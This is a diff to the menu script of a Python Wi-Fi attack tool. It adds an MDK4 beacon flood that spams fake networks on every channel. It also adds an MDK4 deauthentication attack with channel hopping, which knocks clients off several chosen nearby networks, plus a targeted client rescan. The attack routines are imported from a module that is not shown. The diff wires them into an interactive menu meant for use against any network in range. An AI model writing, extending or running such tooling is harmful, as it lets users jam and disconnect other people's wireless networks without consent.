@@ -34,12 +34,15 @@ from deauther import (
     scan_networks_and_clients,
     scan_networks_live,
     scan_networks_realtime,
+    scan_specific_target_clients,
     # Attack
     kill_all_attacks,
     deauth_attack_single_optimized,
     deauth_attack_clients,
     deauth_attack_multi,
-    parse_target_selection
+    parse_target_selection,
+    mdk4_beacon_flood,
+    mdk4_deauth_hopping
 )
 
 
@@ -75,8 +78,10 @@ def main():
         print(f"{Color.CYAN}3.{Color.ENDC} Restart Driver")
         print(f"{Color.CYAN}4.{Color.ENDC} Exit")
         print(f"{Color.GREEN}5.{Color.ENDC} Scan Network & Clients (TARGETED) ✨")
+        print(f"{Color.FAIL}6.{Color.ENDC} MDK4 Beacon Flood (Spam WiFi)")
+        print(f"{Color.WARNING}7.{Color.ENDC} MDK4 Deauth + Channel Hop 🔊")
         
-        choice = input(f"\n{Color.BOLD}Choice [1-5]: {Color.ENDC}")
+        choice = input(f"\n{Color.BOLD}Choice [1-7]: {Color.ENDC}")
         
         if choice == '1':
             handle_broadcast_attack()
@@ -95,6 +100,12 @@ def main():
         
         elif choice == '5':
             handle_targeted_attack()
+            
+        elif choice == '6':
+            handle_mdk4_beacon_flood()
+            
+        elif choice == '7':
+            handle_mdk4_deauth_hopping()
 
 
 def handle_broadcast_attack():
@@ -262,7 +273,24 @@ def handle_targeted_attack():
         return
     
     selected_ap = nets[ap_idx]
-    ap_clients = [c for c in clients if c['bssid'] == selected_ap['bssid']]
+    
+    # NEW: Rescan specifically for this target
+    print(f"\n{Color.BLUE}[*] Performing TARGETED SCAN for {selected_ap['essid']}...{Color.ENDC}")
+    new_clients = scan_specific_target_clients(mon, selected_ap['bssid'], selected_ap['channel'])
+    
+    # Merge clients (prefer new scan results)
+    merged_clients = {}
+    
+    # Add old clients first
+    for c in clients:
+        if c['bssid'] == selected_ap['bssid']:
+            merged_clients[c['station_mac']] = c
+            
+    # Update/Add with new clients
+    for c in new_clients:
+        merged_clients[c['station_mac']] = c
+        
+    ap_clients = list(merged_clients.values())
     
     print(f"\n{Color.HEADER}Selected: {selected_ap['essid']}{Color.ENDC}")
     print(f"  BSSID: {selected_ap['bssid']}")
@@ -345,6 +373,124 @@ def handle_targeted_attack():
             return
     
     input(f"\n{Color.BOLD}Press Enter...{Color.ENDC}")
+
+
+    input(f"\n{Color.BOLD}Press Enter...{Color.ENDC}")
+
+
+def handle_mdk4_beacon_flood():
+    """Handle menu option 6: MDK4 Beacon Flood"""
+    mon = get_mon_interface()
+    if not mon:
+        mon = enable_monitor_mode()
+        
+    print(f"\n{Color.HEADER}{'='*60}{Color.ENDC}")
+    print(f"{Color.HEADER}  MDK4 BEACON FLOOD (SPAM WIFI){Color.ENDC}")
+    print(f"{Color.HEADER}{'='*60}{Color.ENDC}")
+    
+    ssid = input(f"\n{Color.BOLD}Enter SSID Name to spam: {Color.ENDC}")
+    if not ssid:
+        print(f"{Color.FAIL}[!] Empty SSID.{Color.ENDC}")
+        time.sleep(1)
+        return
+        
+    count_str = input(f"{Color.BOLD}Number of copies (default 1): {Color.ENDC}")
+    count = 1
+    if count_str.isdigit() and int(count_str) > 0:
+        count = int(count_str)
+    
+    # Ask about channel hopping
+    print(f"\n{Color.CYAN}[*] Channel Hopping Options:{Color.ENDC}")
+    print(f"  1. Single channel (current)")
+    print(f"  2. All channels (2.4GHz + 5GHz) - BROADCAST EVERYWHERE")
+    hop_choice = input(f"{Color.BOLD}Choice (default 1): {Color.ENDC}").strip()
+    channel_hop = (hop_choice == '2')
+    
+    if channel_hop:
+        print(f"{Color.WARNING}[+] Channel hopping ENABLED - Broadcasting on ALL channels!{Color.ENDC}")
+    else:
+        print(f"{Color.CYAN}[+] Single channel mode{Color.ENDC}")
+        
+    kill_all_attacks()
+    
+    mdk4_beacon_flood(mon, ssid, 0, count, channel_hop)
+    
+    if count > 1:
+        print(f"{Color.GREEN}[+] Beacon flooding '{ssid} 1' to '{ssid} {count}'...{Color.ENDC}")
+    else:
+        print(f"{Color.GREEN}[+] Beacon flooding '{ssid}'...{Color.ENDC}")
+    
+    input(f"\n{Color.BOLD}Press Enter to stop...{Color.ENDC}")
+    kill_all_attacks()
+
+
+def handle_mdk4_deauth_hopping():
+    """Handle menu option 7: MDK4 Deauth with Channel Hopping"""
+    mon = get_mon_interface()
+    if not mon:
+        mon = enable_monitor_mode()
+    
+    print(f"\n{Color.HEADER}{'='*60}{Color.ENDC}")
+    print(f"{Color.HEADER}  MDK4 DEAUTH + CHANNEL HOPPING{Color.ENDC}")
+    print(f"{Color.HEADER}{'='*60}{Color.ENDC}")
+    print(f"{Color.CYAN}[INFO] Mode ini bisa menyerang target di BERBAGAI channel!{Color.ENDC}")
+    print(f"{Color.CYAN}[INFO] Cocok untuk multi-target di channel yang berbeda-beda.{Color.ENDC}")
+    
+    # Scan networks
+    nets = scan_networks_realtime(mon)
+    
+    if not nets:
+        print(f"{Color.FAIL}[!] No networks found.{Color.ENDC}")
+        time.sleep(2)
+        return
+    
+    # Display results
+    print(f"\n{Color.WARNING}No  PWR    CH   BAND   ENC           BSSID              ESSID{Color.ENDC}")
+    print("-" * 100)
+    for i, n in enumerate(nets):
+        band_color = Color.CYAN if n.get('band') == '5G' else Color.GREEN
+        enc = n.get('encryption', '?')
+        bssid = n.get('bssid', '??:??:??:??:??:??')
+        if 'WPA3' in enc:
+            enc_color = Color.CYAN
+        elif 'WPA2' in enc:
+            enc_color = Color.GREEN
+        elif 'WEP' in enc or 'OPN' in enc:
+            enc_color = Color.FAIL
+        else:
+            enc_color = Color.WARNING
+        print(f"{i+1:<3} {n['power']:>4}   {n['channel']:>3}  {band_color}{n.get('band', '?'):>4}{Color.ENDC}   {enc_color}{enc:<13}{Color.ENDC} {bssid}   {n['essid']}")
+    print("-" * 100)
+    
+    print(f"\n{Color.GREEN}[TIP] Bisa pilih multi-target: 1,2,3,4,5{Color.ENDC}")
+    print(f"{Color.GREEN}[TIP] Target di channel berbeda akan di-hop otomatis!{Color.ENDC}")
+    
+    pilih = input(f"\n{Color.BOLD}Target numbers ('m' for menu): {Color.ENDC}")
+    
+    if pilih.lower() == 'm':
+        return
+    
+    indices = parse_target_selection(pilih, len(nets))
+    if not indices:
+        return
+    
+    selected_targets = [nets[i-1] for i in indices]
+    
+    # Show selected targets and channels
+    channels = list(set([t.get('channel', '?') for t in selected_targets]))
+    
+    print(f"\n{Color.CYAN}[*] Selected {len(selected_targets)} target(s) on {len(channels)} channel(s):{Color.ENDC}")
+    for t in selected_targets:
+        print(f"  • {t['essid']} ({t['bssid']}) - CH {t['channel']}")
+    print(f"{Color.CYAN}[*] Channels to hop: {', '.join(channels)}{Color.ENDC}")
+    
+    kill_all_attacks()
+    
+    # Start attack with channel hopping
+    mdk4_deauth_hopping(selected_targets, mon)
+    
+    input(f"\n{Color.BOLD}Press Enter to stop...{Color.ENDC}")
+    kill_all_attacks()
 
 
 if __name__ == "__main__":
